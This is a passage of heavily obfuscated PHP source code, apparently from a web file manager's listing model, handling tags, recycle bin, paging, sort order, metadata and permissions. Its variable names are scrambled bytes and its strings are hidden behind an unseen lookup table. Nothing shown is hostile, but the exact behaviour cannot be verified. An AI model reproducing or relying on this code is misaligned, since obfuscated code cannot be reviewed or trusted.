$ÛŒñ¾Ù¬[$Ë©²Æ·ò[84]], $Ë©²Æ·ò[422] => $ÛŒñ¾Ù¬[$Ë©²Æ·ò[33]], $Ë©²Æ·ò[423] => $ÛŒñ¾Ù¬[$Ë©²Æ·ò[200]], $Ë©²Æ·ò[424] => $ÛŒñ¾Ù¬[$Ë©²Æ·ò[85]]); if ($ÛŒñ¾Ù¬[$Ë©²Æ·ò[33]] == $Ë©²Æ·ò[416] && $«œöï…—[$ÛŒñ¾Ù¬[$Ë©²Æ·ò[84]]]) { $ÛŒñ¾Ù¬[$Ë©²Æ·ò[86]] = $«œöï…—[$ÛŒñ¾Ù¬[$Ë©²Æ·ò[84]]]; } } unset($ÛŒñ¾Ù¬); return $§’Ÿ¶ú; } public function listUserTag($Ô“‚ë®) { $ÖôÅ’»è =& $_SERVER[ä¿÷‹µ±]; if ($Ô“‚ë® && !is_array($Ô“‚ë®)) { $Ô“‚ë® = array($Ô“‚ë®); } $Ñº™ Ó­ = Model($ÖôÅ’»è[425])->listData(); $™˜şõÉ = array(); $Íšó”¬ = array(); foreach ($Ñº™ Ó­ as $ÈŒØî™) { $Àá ß±’ = $ÈŒØî™[$ÖôÅ’»è[84]]; if (!$Àá ß±’) { continue; } if (!isset($Íšó”¬[$Àá ß±’])) { $Íšó”¬[$Àá ß±’] = array(); } $Íšó”¬[$Àá ß±’][] = $ÈŒØî™[$ÖôÅ’»è[426]]; $™˜şõÉ[$ÈŒØî™[$ÖôÅ’»è[84]]] = $ÈŒØî™; } $·æ”·« = array(); $–¥•× ò = array(); $Õ‘„ö¨„ = array(); foreach ($Íšó”¬ as $ËÏˆ¿¸› => $Ğ×ñíœ‚) { $ùŞš¼şİ = !0; if (!$Ô“‚ë®) { $·æ”·«[] = $ËÏˆ¿¸›; continue; } foreach ($Ô“‚ë® as $‚³ÎùÎù) { if (!in_array($‚³ÎùÎù, $Ğ×ñíœ‚)) { $ùŞš¼şİ = !1; break; } } if (!$ùŞš¼şİ) { continue; } if (!is_numeric($ËÏˆ¿¸›)) { $æÁ­ñ = $™˜şõÉ[$ËÏˆ¿¸›]; $ÂÓ·Ïö¶ = array($ÖôÅ’»è[32] => $æÁ­ñ[$ÖôÅ’»è[32]], $ÖôÅ’»è[84] => $æÁ­ñ[$ÖôÅ’»è[84]], $ÖôÅ’»è[33] => $æÁ­ñ[$ÖôÅ’»è[33]], $ÖôÅ’»è[86] => array($ÖôÅ’»è[427] => 1), $ÖôÅ’»è[201] => !0); if ($æÁ­ñ[$ÖôÅ’»è[33]] == $ÖôÅ’»è[199]) { $Õ‘„ö¨„[] = $ÂÓ·Ïö¶; } if ($æÁ­ñ[$ÖôÅ’»è[33]] == $ÖôÅ’»è[75]) { $–¥•× ò[] = $ÂÓ·Ïö¶; } continue; } $·æ”·«[] = $ËÏˆ¿¸›; } if ($·æ”·«) { $ ïÒºéÅ = $this->listSource(array($ÖôÅ’»è[417] => array($ÖôÅ’»è[418], $·æ”·«))); } $ ïÒºéÅ = $ ïÒºéÅ ? $ ïÒºéÅ : array($ÖôÅ’»è[82] => array(), $ÖôÅ’»è[83] => array()); $ ïÒºéÅ[$ÖôÅ’»è[82]] = array_merge($ ïÒºéÅ[$ÖôÅ’»è[82]], $–¥•× ò); $ ïÒºéÅ[$ÖôÅ’»è[83]] = array_merge($ ïÒºéÅ[$ÖôÅ’»è[83]], $Õ‘„ö¨„); if (isset($ ïÒºéÅ[$ÖôÅ’»è[366]]) && count($·æ”·«) == $ ïÒºéÅ[$ÖôÅ’»è[366]][$ÖôÅ’»è[367]]) { return $ ïÒºéÅ; } $åÓœÃğÜ = array(); $¥»ÌÆ‚ = array_to_keyvalue($ ïÒºéÅ[$ÖôÅ’»è[82]], $ÖôÅ’»è[12], $ÖôÅ’»è[402]); $ı×¸Ê€ó = array_to_keyvalue($ ïÒºéÅ[$ÖôÅ’»è[83]], $ÖôÅ’»è[12], $ÖôÅ’»è[402]); $£úñœÚÊ = array_merge($ı×¸Ê€ó, $¥»ÌÆ‚); foreach ($·æ”·« as $Àá ß±’) { if (!in_array($Àá ß±’, $£úñœÚÊ)) { $åÓœÃğÜ[] = $Àá ß±’; } } if ($åÓœÃğÜ) { Model($ÖôÅ’»è[428])->removeBySource($åÓœÃğÜ); } return $ ïÒºéÅ; } public function listUserRecycle() { $˜Œ‡±õ =& $_SERVER[ä¿÷‹µ±]; $øÛ²Ğ§¿ = Model($˜Œ‡±õ[429])->listData(); if (!$øÛ²Ğ§¿) { return array(); } $ˆèÆ»¬„ = array($˜Œ‡±õ[417] => array($˜Œ‡±õ[418], $øÛ²Ğ§¿), $˜Œ‡±õ[430] => 1); return $this->listSource($ˆèÆ»¬„); } public function listSource($æãü³Ø, $™£ºË›” = 3000, $õŠüŞ = false) { $Õô…ÏÇ =& $_SERVER[ä¿÷‹µ±]; if (!isset($æãü³Ø[$Õô…ÏÇ[431]])) { $æãü³Ø[$Õô…ÏÇ[431]] = 0; } if (isset($æãü³Ø[$Õô…ÏÇ[432]]) && $æãü³Ø[$Õô…ÏÇ[432]] == $Õô…ÏÇ[197]) { $æãü³Ø[$Õô…ÏÇ[412]] = array($Õô…ÏÇ[331], $Õô…ÏÇ[433]); } $¡İ”õá = $Õô…ÏÇ[434]; $ğşµé§İ = $this->field($¡İ”õá)->_makeOrder()->where($æãü³Ø)->selectPage($™£ºË›”); $this->_listPageCheck($ğşµé§İ, $¡İ”õá, $æãü³Ø); $this->_listDataApply($ğşµé§İ[$Õô…ÏÇ[369]], $õŠüŞ); $this->_listMake($ğşµé§İ); return $ğşµé§İ; } private function _listPageCheck(&$œ¥µ×î´, $ÆòçÛŞç, $Şòı¿Š´) { $¹ñî¹­Å =& $_SERVER[ä¿÷‹µ±]; if (!is_array($œ¥µ×î´[$¹ñî¹­Å[366]])) { return; } $–¤‡‡ı’ = $œ¥µ×î´[$¹ñî¹­Å[366]]; if ($–¤‡‡ı’[$¹ñî¹­Å[368]] <= 1) { return; } if ($–¤‡‡ı’[$¹ñî¹­Å[367]] >= 100000) { return; } if (Model($¹ñî¹­Å[435])->get($¹ñî¹­Å[436]) != $¹ñî¹­Å[437]) { return; } $ÆòçÛŞç = str_replace(array($¹ñî¹­Å[53], $¹ñî¹­Å[342], $¹ñî¹­Å[231]), $¹ñî¹­Å[12], $ÆòçÛŞç); $ÆòçÛŞç = $¹ñî¹­Å[438] . str_replace($¹ñî¹­Å[50], $¹ñî¹­Å[439], $ÆòçÛŞç) . $¹ñî¹­Å[440]; $£…”ëÁ’ = $¹ñî¹­Å[441]; $£…”ëÁ’ = $£…”ëÁ’ . $¹ñî¹­Å[442]; $í†à×ä¶ = $–¤‡‡ı’[$¹ñî¹­Å[363]] * ($–¤‡‡ı’[$¹ñî¹­Å[353]] - 1) . $¹ñî¹­Å[50] . $–¤‡‡ı’[$¹ñî¹­Å[363]]; $Á¬ öÚÍ = $this->_makeOrder(!0); $¯©ÊÃ› = $¹ñî¹­Å[438] . str_replace($¹ñî¹­Å[50], $¹ñî¹­Å[439], $Á¬ öÚÍ[0]); if (strpos($¯©ÊÃ›, $¹ñî¹­Å[443])) { $¯©ÊÃ› = str_replace($¹ñî¹­Å[443], $¹ñî¹­Å[444], $¯©ÊÃ›); } else { $¯©ÊÃ› .= $¹ñî¹­Å[445] . $Á¬ öÚÍ[1]; } $àë“èĞ¡ = array(); foreach ($Şòı¿Š´ as $ÕîÖ´Àì => $º×™å«õ) { $àë“èĞ¡[$¹ñî¹­Å[438] . $ÕîÖ´Àì] = $º×™å«õ; } $this->alias($¹ñî¹­Å[446])->field($ÆòçÛŞç)->limit($í†à×ä¶)->order($¯©ÊÃ›); $ÎŠ™ó­š = $this->join($£…”ëÁ’)->where($àë“èĞ¡)->select(); if ($ÎŠ™ó­š) { $œ¥µ×î´[$¹ñî¹­Å[369]] = $ÎŠ™ó­š; } } protected function _makeOrder($¹ï•¼‚Ü = false) { $éšòÚì =& $_SERVER[ä¿÷‹µ±]; $²„ó‰¥ä = Model($éšòÚì[447])->get($éšòÚì[448]); $¼Ö»×”‰ = Model($éšòÚì[447])->get($éšòÚì[449]); $Çñê« = array($éšòÚì[450] => $éšòÚì[451], $éšòÚì[452] => $éšòÚì[453]); $Ì©¿‚İ = array($éšòÚì[32] => $éšòÚì[32], $éšòÚì[76] => $éšòÚì[76], $éšòÚì[174] => $éšòÚì[412], $éšòÚì[454] => $éšòÚì[454], $éšòÚì[455] => $éšòÚì[456], $éšòÚì[200] => $éšòÚì[200], $éšòÚì[85] => $éšòÚì[85]); $ëñÒÛ²Ô = Input::get($éšòÚì[457], $éšòÚì[7], $²„ó‰¥ä, array_keys($Ì©¿‚İ)); $³¤£É‡ = Input::get($éšòÚì[458], $éšòÚì[7], $¼Ö»×”‰, array_keys($Çñê«)); if (!in_array($ëñÒÛ²Ô, array_keys($Ì©¿‚İ))) { $ëñÒÛ²Ô = $éšòÚì[32]; } if (!in_array($³¤£É‡, array_keys($Çñê«))) { $ëñÒÛ²Ô = $éšòÚì[450]; } if ($ëñÒÛ²Ô == $éšòÚì[32]) { } $ˆÉÛŸöî = $éšòÚì[459] . $Ì©¿‚İ[$ëñÒÛ²Ô] . $éšòÚì[53] . $Çñê«[$³¤£É‡]; $ˆÉÛŸöî = rtrim(trim($ˆÉÛŸöî), $éšòÚì[50]); if ($¹ï•¼‚Ü) { return array($ˆÉÛŸöî, $Çñê«[$³¤£É‡]); } return $this->order($ˆÉÛŸöî); } protected function _listDataApplyItem($Óïõ÷Å, $‡§­Š—š = false) { $û¥ŞÃÎ‰ = array($Óïõ÷Å); $this->_listDataApply($û¥ŞÃÎ‰, $‡§­Š—š); return $û¥ŞÃÎ‰[0]; } protected function _listDataApply(&$¾âŒ€Ÿ, $îÙªïÇÇ = false) { $ÉÄÜç® =& $_SERVER[ä¿÷‹µ±]; if (!$¾âŒ€Ÿ) { $¾âŒ€Ÿ = array(); return; } $Ë‰¯…ƒ  = array_to_keyvalue($¾âŒ€Ÿ, $ÉÄÜç®[12], $ÉÄÜç®[402]); $Ë‰¯…ƒ  = array_unique($Ë‰¯…ƒ ); $this->_listSourceCache($¾âŒ€Ÿ); if (!$îÙªïÇÇ) { $this->_listAppendMeta($¾âŒ€Ÿ, $Ë‰¯…ƒ ); $this->_listAppendFileMeta($¾âŒ€Ÿ, $Ë‰¯…ƒ ); $this->_listAppendChildren($¾âŒ€Ÿ, $Ë‰¯…ƒ ); } $this->_listAppendPath($¾âŒ€Ÿ); $this->_listAppendAuth($¾âŒ€Ÿ); $this->_listAppendSourceInfo($¾âŒ€Ÿ, $Ë‰¯…ƒ ); $this->_listAppendUser($¾âŒ€Ÿ); $this->_listFilterInfo($¾âŒ€Ÿ, $îÙªïÇÇ); $this->_listAppendAuthSecret($¾âŒ€Ÿ); } protected function _listSourceCache($ƒÓñû½ê) { $–éÑƒÄ =& $_SERVER[ä¿÷‹µ±]; foreach ($ƒÓñû½ê as $Ó›¿“šÌ) { self::$cacheSourceInfo[$–éÑƒÄ[460] . $Ó›¿“šÌ[$–éÑƒÄ[402]]] = $Ó›¿“šÌ; } } protected function _listFilterInfo(&$£¦ÜŸİ, $›ÒÅ‡¾˜ = false) { $Ò­«µ¥Â =& $_SERVER[ä¿÷‹µ±]; foreach ($£¦ÜŸİ as &$éĞ“ƒš·) { $éĞ“ƒš· = $this->pathInfoFilter($éĞ“ƒš·); self::$cachePathInfo[$Ò­«µ¥Â[461] . intval($›ÒÅ‡¾˜) . $Ò­«µ¥Â[386] . $éĞ“ƒš·[$Ò­«µ¥Â[402]]] = $éĞ“ƒš·; } unset($éĞ“ƒš·); } protected function _listMake(&$·ˆ£ÇÈ’) { $‚¯¶œí˜ =& $_SERVER[ä¿÷‹µ±]; $·ˆ£ÇÈ’[$‚¯¶œí˜[82]] = array(); $·ˆ£ÇÈ’[$‚¯¶œí˜[83]] = array(); foreach ($·ˆ£ÇÈ’[$‚¯¶œí˜[369]] as $Ôè¹‰¨—) { $œí›ºÒ™ = $Ôè¹‰¨—[$‚¯¶œí˜[410]] == 1 ? $‚¯¶œí˜[82] : $‚¯¶œí˜[83]; $·ˆ£ÇÈ’[$œí›ºÒ™][] = $Ôè¹‰¨—; } unset($·ˆ£ÇÈ’[$‚¯¶œí˜[369]]); } protected function _listAppendMeta(&$êøò®ìš, $·úë—Ş‘) { $•œØ€…í =& $_SERVER[ä¿÷‹µ±]; $ŸéışĞ = array($•œØ€…í[417] => array($•œØ€…í[418], $·úë—Ş‘)); $–‘Ò²—² = Model($•œØ€…í[462])->field($•œØ€…í[463])->where($ŸéışĞ)->select(); if (!$–‘Ò²—²) { return; } $ãã¶Ó›Õ = array($•œØ€…í[464], $•œØ€…í[465], $•œØ€…í[444]); $ê›²ö¢ = array(); foreach ($–‘Ò²—² as $÷æ˜œ©«) { if (!isset($ê›²ö¢[$÷æ˜œ©«[$•œØ€…í[402]]])) { $ê›²ö¢[$÷æ˜œ©«[$•œØ€…í[402]]] = array(); } if (in_array($÷æ˜œ©«[$•œØ€…í[94]], $ãã¶Ó›Õ)) { continue; } $ê›²ö¢[$÷æ˜œ©«[$•œØ€…í[402]]][$÷æ˜œ©«[$•œØ€…í[94]]] = $÷æ˜œ©«[$•œØ€…í[374]]; } foreach ($êøò®ìš as &$ººµûç¿) { $ººµûç¿[$•œØ€…í[466]] = !1; if (isset($ê›²ö¢[$ººµûç¿[$•œØ€…í[402]]])) { $ººµûç¿[$•œØ€…í[466]] = $ê›²ö¢[$ººµûç¿[$•œØ€…í[402]]]; } if ($this->fileIsLock($ººµûç¿) && $ººµûç¿[$•œØ€…í[413]]) { $ö¹‹´áˆ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ººµûç¿[$•œØ€…í[413]][$•œØ€…í[414]] = AuthModel::authDisable($ººµûç¿[$•œØ€…í[413]][$•œØ€…í[414]], $ö¹‹´áˆ); $ººµûç¿[$•œØ€…í[413]][$•œØ€…í[467]][$•œØ€…í[413]] = $ººµûç¿[$•œØ€…í[413]][$•œØ€…í[414]]; } } unset($ººµûç¿); } protected function _listAppendFileMeta(&$‡Æ®Ğù«, $ûªÅå¸«) { $Û¢’şğ“ =& $_SERVER[ä¿÷‹µ±]; $˜’íÉÃ = array_to_keyvalue($‡Æ®Ğù«, $Û¢’şğ“[12], $Û¢’şğ“[468]); $˜’íÉÃ = array_filter(array_unique($˜’íÉÃ)); if (!$˜’íÉÃ) { return; } $ñîßÒ = array($Û¢’şğ“[469] => array($Û¢’şğ“[418], $˜’íÉÃ)); $ù“©ÑÔ± = $Û¢’şğ“[470]; $Ò‡ˆî·¯ = Model($Û¢’şğ“[471])->field($ù“©ÑÔ±)->where($ñîßÒ)->select(); $Ò‡ˆî·¯ = array_to_keyvalue($Ò‡ˆî·¯, $Û¢’şğ“[468]); $øö­×¡ = Model($Û¢’şğ“[472])->field($Û¢’şğ“[473])->where($ñîßÒ)->select(); $øö­×¡ = $øö­×¡ ? $øö­×¡ : array(); $€ÙÍ³Å² = array(); foreach ($øö­×¡ as $ø³œæ¯í) { if (!isset($€ÙÍ³Å²[$ø³œæ¯í[$Û¢’şğ“[468]]])) { $€ÙÍ³Å²[$ø³œæ¯í[$Û¢’şğ“[468]]] = array(); } $€ÙÍ³Å²[$ø³œæ¯í[$Û¢’şğ“[468]]][$ø³œæ¯í[$Û¢’şğ“[94]]] = $ø³œæ¯í[$Û¢’şğ“[374]]; } foreach ($‡Æ®Ğù« as &$’©Œ Â‘) { $åÕÏ¥¹“ = $’©Œ Â‘[$Û¢’şğ“[468]]; if (!$åÕÏ¥¹“ || !is_array($Ò‡ˆî·¯[$åÕÏ¥¹“])) { continue; } $Ñ§‘ò = $Ò‡ˆî·¯[$åÕÏ¥¹“]; $Ñ§‘ò[$Û¢’şğ“[76]] = $’©Œ Â‘[$Û¢’şğ“[76]]; $Ñ§‘ò[$Û¢’şğ“[32]] = $’©Œ Â‘[$Û¢’şğ“[32]]; if (!isset(self::$cacheFileInfo[$Û¢’şğ“[474] . $åÕÏ¥¹“])) { self::$cacheFileInfo[$Û¢’şğ“[474] . $åÕÏ¥¹“] = array_merge(array(), $Ñ§‘ò); } unset($Ò‡ˆî·¯[$åÕÏ¥¹“][$Û¢’şğ“[84]]); $Ô‘‘¬ø½ = is_array($€ÙÍ³Å²[$åÕÏ¥¹“]) ? $€ÙÍ³Å²[$åÕÏ¥¹“] : array(); $’©Œ Â‘[$Û¢’şğ“[170]] = array_merge($Ô‘‘¬ø½, $Ò‡ˆî·¯[$åÕÏ¥¹“]); if (isset($’©Œ Â‘[$Û¢’şğ“[170]][$Û¢’şğ“[169]])) { $’©Œ Â‘[$Û¢’şğ“[169]] = json_decode($’©Œ Â‘[$Û¢’şğ“[170]][$Û¢’şğ“[169]], !0); unset($’©Œ Â‘[$Û¢’şğ“[170]][$Û¢’şğ“[169]]); } } unset($’©Œ Â‘); } protected function _listAppendSourceInfo(&$êŒåêû®, $…×Ã³»¨) { $â„ã¸‹Î =& $_SERVER[ä¿÷‹µ±]; if (!defined($â„ã¸‹Î[475])) { return; } $Äç‰®˜É = Model($â„ã¸‹Î[476])->listData(); $î¥à³¯ª = Model($â„ã¸‹Î[425])->listData(); $â¦½¹îô = Model($â„ã¸‹Î[415])->listData(); $‚àÃ›¹¨ = Model($â„ã¸‹Î[477])->listSimple(); $‡°¸‡ı = array_to_keyvalue($Äç‰®˜É, $â„ã¸‹Î[399]); $§ó©Æ˜Å = array_to_keyvalue_group($î¥à³¯ª, $â„ã¸‹Î[84], $â„ã¸‹Î[426]); $ÃœõÔãÎ = array_to_keyvalue($â¦½¹îô, $â„ã¸‹Î[84]); $¯ñ¡•‡ = array_to_keyvalue_group($‚àÃ›¹¨, $â„ã¸‹Î[402]); foreach ($êŒåêû® as &$Ÿû¬°Ğ¿) { $Ÿû¬°Ğ¿[$â„ã¸‹Î[86]] = array($â„ã¸‹Î[478] => 0, $â„ã¸‹Î[479] => 0, $â„ã¸‹Î[480] => 0); if (isset($ÃœõÔãÎ[$Ÿû¬°Ğ¿[$â„ã¸‹Î[402]]])) { $Ÿû¬°Ğ¿[$â„ã¸‹Î[86]][$â„ã¸‹Î[481]] = 1; $Ÿû¬°Ğ¿[$â„ã¸‹Î[86]][$â„ã¸‹Î[482]] = $ÃœõÔãÎ[$Ÿû¬°Ğ¿[$â„ã¸‹Î[402]]][$â„ã¸‹Î[32]]; } if ($§ó©Æ˜Å && $‡°¸‡ı && isset($§ó©Æ˜Å[$Ÿû¬°Ğ¿[$â„ã¸‹Î[402]]])) { $Ÿû¬°Ğ¿[$â„ã¸‹Î[86]][$â„ã¸‹Î[483]] = array(); foreach ($§ó©Æ˜Å[$Ÿû¬°Ğ¿[$â„ã¸‹Î[402]]] as $™›Äá­) { $šƒª´¬Ü = $‡°¸‡ı[$™›Äá­]; $Ÿû¬°Ğ¿[$â„ã¸‹Î[86]][$â„ã¸‹Î[483]][] = array($â„ã¸‹Î[484] => $šƒª´¬Ü[$â„ã¸‹Î[399]], $â„ã¸‹Î[420] => $šƒª´¬Ü[$â„ã¸‹Î[32]], $â„ã¸‹Î[485] => $šƒª´¬Ü[$â„ã¸‹Î[486]]); } } if ($¯ñ¡•‡ && isset($¯ñ¡•‡[$Ÿû¬°Ğ¿[$â„ã¸‹Î[402]]])) { $Ÿû¬°Ğ¿[$â„ã¸‹Î[86]][$â„ã¸‹Î[487]] = array(); foreach ($¯ñ¡•‡[$Ÿû¬°Ğ¿[$â„ã¸‹Î[402]]] as $ªØï“îØ) { $Ÿû¬°Ğ¿[$â„ã¸‹Î[86]][$â„ã¸‹Î[487]] = array($â„ã¸‹Î[488] => $ªØï“îØ[$â„ã¸‹Î[489]], $â„ã¸‹Î[490] => $ªØï“îØ[$â„ã¸‹Î[491]], $â„ã¸‹Î[492] => $ªØï“îØ[$â„ã¸‹Î[402]], $â„ã¸‹Î[493] => $ªØï“îØ[$â„ã¸‹Î[494]], $â„ã¸‹Î[495] => $ªØï“îØ[$â„ã¸‹Î[496]], $â„ã¸‹Î[497] => $ªØï“îØ[$â„ã¸‹Î[497]], $â„ã¸‹Î[498] => $ªØï“îØ[$â„ã¸‹Î[498]]); } } } unset($Ÿû¬°Ğ¿); return $êŒåêû®; } protected function _listAppendChildren(&$¼•Şà”³, $Äº½“ª³) { $“—çË¡¤ =& $_SERVER[ä¿÷‹µ±]; $­±çĞã = array(); $øõíù£ = array($“—çË¡¤[207] => 0, $“—çË¡¤[208] => 0); foreach ($¼•Şà”³ as &$şÒÈôÁ) { if (!$şÒÈôÁ[$“—çË¡¤[410]]) { continue; } $­±çĞã[] = $şÒÈôÁ[$“—çË¡¤[402]]; } unset($şÒÈôÁ); if (!$­±çĞã) { return; } $‘ıÊÄÓ† = array($“—çË¡¤[432] => array($“—çË¡¤[7], $­±çĞã), $“—çË¡¤[431] => 0); $ñÂİ“˜˜ = array($“—çË¡¤[432], $“—çË¡¤[410], $“—çË¡¤[499] => $“—çË¡¤[500]); $¾‰ãÃä¶ = $this->field($ñÂİ“˜˜)->where($‘ıÊÄÓ†)->group($“—çË¡¤[501])->select(); $ÄŞ˜ó± = array(); foreach ($¾‰ãÃä¶ as $ù¿éìŠ’) { $åË×íØ = $ù¿éìŠ’[$“—çË¡¤[432]]; $ïË„ê š = $ù¿éìŠ’[$“—çË¡¤[410]] == $“—çË¡¤[88] ? $“—çË¡¤[208] : $“—çË¡¤[207]; if (!isset($ÄŞ˜ó±[$åË×íØ])) { $ÄŞ˜ó±[$åË×íØ] = array($“—çË¡¤[207] => 0, $“—çË¡¤[208] => 0); } $ÄŞ˜ó±[$åË×íØ][$ïË„ê š] += $ù¿éìŠ’[$“—çË¡¤[500]]; } foreach ($¼•Şà”³ as &$şÒÈôÁ) { if (!$şÒÈôÁ[$“—çË¡¤[410]]) { continue; } $»´£‘‚ = is_array($ÄŞ˜ó±[$şÒÈôÁ[$“—çË¡¤[402]]]) ? $ÄŞ˜ó±[$şÒÈôÁ[$“—çË¡¤[402]]] : $øõíù£; $şÒÈôÁ[$“—çË¡¤[208]] = $»´£‘‚[$“—çË¡¤[208]]; $şÒÈôÁ[$“—çË¡¤[207]] = $»´£‘‚[$“—çË¡¤[207]]; unset($şÒÈôÁ[$“—çË¡¤[412]]); } unset($şÒÈôÁ); } protected function _listAppendAuth(&$ƒúÚ¾ûÙ) { $âŸ”–ª© =& $_SERVER[ä¿÷‹µ±]; if (!defined($âŸ”–ª©[475])) { return; } $¿µ–ı·¿ = array(); foreach ($ƒúÚ¾ûÙ as $Ê¶“°‘—) { if ($Ê¶“°‘—[$âŸ”–ª©[411]] == self::TYPE_GROUP) { $¿µ–ı·¿[] = $Ê¶“°‘—[$âŸ”–ª©[402]]; } } if (!$¿µ–ı·¿) { return; } $—«µà—– = array_to_keyvalue($ƒúÚ¾ûÙ, $âŸ”–ª©[402]); $È¯¯»›ï = Model($âŸ”–ª©[502])->getSourceList($¿µ–ı·¿, $—«µà—–); $¥Ã¹Á“º = $GLOBALS[$âŸ”–ª©[503]] == 1; foreach ($ƒúÚ¾ûÙ as $•¡Î “ => &$Ê¶“°‘—) { $Ê¶“°‘—[$âŸ”–ª©[413]] = $È¯¯»›ï[$Ê¶“°‘—[$âŸ”–ª©[402]]]; if (!$Ê¶“°‘—[$âŸ”–ª©[413]] && $Ê¶“°‘—[$âŸ”–ª©[411]] == self::TYPE_GROUP) { $Ê¶“°‘—[$âŸ”–ª©[413]] = Action($âŸ”–ª©[504])->pathGroupAuthMake($Ê¶“°‘—[$âŸ”–ª©[505]]); if (!$Ê¶“°‘—[$âŸ”–ª©[413]] && !$¥Ã¹Á“º) { $Ê¶“°‘—[$âŸ”–ª©[202]] = !1; $Ê¶“°‘—[$âŸ”–ª©[201]] = !1; } } if ($Ê¶“°‘—[$âŸ”–ª©[413]]) { $Ê¶“°‘—[$âŸ”–ª©[202]] = AuthModel::authCheckEdit($Ê¶“°‘—[$âŸ”–ª©[413]][$âŸ”–ª©[414]]); $Ê¶“°‘—[$âŸ”–ª©[201]] = AuthModel::authCheckView($Ê¶“°‘—[$âŸ”–ª©[413]][$âŸ”–ª©[414]]); } $this->groupPathDisplay($Ê¶“°‘—); } unset($Ê¶“°‘—); } public function _listAppendAuthSecret(&$È¯óØ¨‡) { $ŸŸˆèÄ• =& $_SERVER[ä¿÷‹µ±]; if (Model($ŸŸˆèÄ•[435])->get($ŸŸˆèÄ•[506]) != $ŸŸˆèÄ•[88]) { return; } static $òÃ•â±Û = false; if (!$òÃ•â±Û) { $Ö“·¦Ö = Model($ŸŸˆèÄ•[507]); $ì—ìõğÀ = Model($ŸŸˆèÄ•[508]); $òÃ•â±Û = $ì—ìõğÀ->listData(); $òÃ•â±Û = array_to_keyvalue($òÃ•â±Û, $ŸŸˆèÄ•[402]); $õÉœŒ¡ = json_decode(Model($ŸŸˆèÄ•[435])->get($ŸŸˆèÄ•[509]), !0); $õÉœŒ¡ = array_to_keyvalue($õÉœŒ¡, $ŸŸˆèÄ•[399]); foreach ($òÃ•â±Û as $İ¾ˆÜÖ£ => $ÁÒ­ããÎ) { $¬ŒÑŸ¿ = $õÉœŒ¡[$ÁÒ­ããÎ[$ŸŸˆèÄ•[510]]]; if (!$¬ŒÑŸ¿) { $ì—ìõğÀ->remove($ÁÒ­ããÎ[$ŸŸˆèÄ•[399]]); unset($òÃ•â±Û[$İ¾ˆÜÖ£]); continue; } $ÜÔÎĞø× = $Ö“·¦Ö->listData($¬ŒÑŸ¿[$ŸŸˆèÄ•[413]]); if (!$ÜÔÎĞø×) { $ì—ìõğÀ->remove($ÁÒ­ããÎ[$ŸŸˆèÄ•[399]]); unset($òÃ•â±Û[$İ¾ˆÜÖ£]); continue; } $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]] = $ÜÔÎĞø×; $ÁÒ­ããÎ[$ŸŸˆèÄ•[511]] = $¬ŒÑŸ¿; $ÁÒ­ããÎ[$ŸŸˆèÄ•[512]] = Model($ŸŸˆèÄ•[513])->getInfoSimpleOuter($ÁÒ­ããÎ[$ŸŸˆèÄ•[454]]); $òÃ•â±Û[$İ¾ˆÜÖ£] = $ÁÒ­ããÎ; } } $è¨¨ı« = defined($ŸŸˆèÄ•[514]) ? USER_ID : $ŸŸˆèÄ•[12]; $ö…ƒÙ = array(); $öşã÷î = $this->_listAppendPath($ö…ƒÙ, !0); foreach ($È¯óØ¨‡ as $İ¾ˆÜÖ£ => &$ÁÒ­ããÎ) { if (!is_array($ÁÒ­ããÎ[$ŸŸˆèÄ•[413]])) { continue; } if ($ÁÒ­ããÎ[$ŸŸˆèÄ•[411]] != $ŸŸˆèÄ•[515]) { continue; } if (isset($òÃ•â±Û[$ÁÒ­ããÎ[$ŸŸˆèÄ•[402]]])) { $æ·Úşò = $òÃ•â±Û[$ÁÒ­ããÎ[$ŸŸˆèÄ•[402]]]; if (!is_array($ÁÒ­ããÎ[$ŸŸˆèÄ•[466]])) { $ÁÒ­ããÎ[$ŸŸˆèÄ•[466]] = array(); } $ÁÒ­ããÎ[$ŸŸˆèÄ•[466]][$ŸŸˆèÄ•[516]] = $æ·Úşò[$ŸŸˆèÄ•[510]]; $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[517]] = $æ·Úşò; $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[518]] = $ÁÒ­ããÎ[$ŸŸˆèÄ•[519]]; $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[520]] = $ŸŸˆèÄ•[88]; if ($æ·Úşò[$ŸŸˆèÄ•[454]] != $è¨¨ı«) { $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[414]] = $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[414]] & $æ·Úşò[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[413]]; } continue; } $Ìæ‘…ˆ˜ = $this->parentLevelArray($ÁÒ­ããÎ[$ŸŸˆèÄ•[521]]); $¿Ù»ÛŞ¦ = array_reverse($Ìæ‘…ˆ˜); foreach ($¿Ù»ÛŞ¦ as $ü´°Â¥ı => $–ç’Ó´¾) { if (!isset($òÃ•â±Û[$–ç’Ó´¾])) { continue; } $æ·Úşò = $òÃ•â±Û[$–ç’Ó´¾]; $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[517]] = $æ·Úşò; if ($æ·Úşò[$ŸŸˆèÄ•[454]] != $è¨¨ı«) { $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[414]] = $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[414]] & $æ·Úşò[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[413]]; } $ŒÄï—¥’ = $ŸŸˆèÄ•[12]; $²êÛòê = count($Ìæ‘…ˆ˜) - $ü´°Â¥ı; for ($¦õ¥Û€Ã = 0; $¦õ¥Û€Ã < $²êÛòê; $¦õ¥Û€Ã++) { if (!isset($öşã÷î[$Ìæ‘…ˆ˜[$¦õ¥Û€Ã]])) { $ŒÄï—¥’ = $ŸŸˆèÄ•[12]; break; } $ŒÄï—¥’ = $ŒÄï—¥’ . rtrim($öşã÷î[$Ìæ‘…ˆ˜[$¦õ¥Û€Ã]], $ŸŸˆèÄ•[8]) . $ŸŸˆèÄ•[8]; } $ÁÒ­ããÎ[$ŸŸˆèÄ•[413]][$ŸŸˆèÄ•[518]] = rtrim($ŒÄï—¥’, $ŸŸˆèÄ•[8]) . $ŸŸˆèÄ•[8]; break; } } unset($ÁÒ­ããÎ); } public function 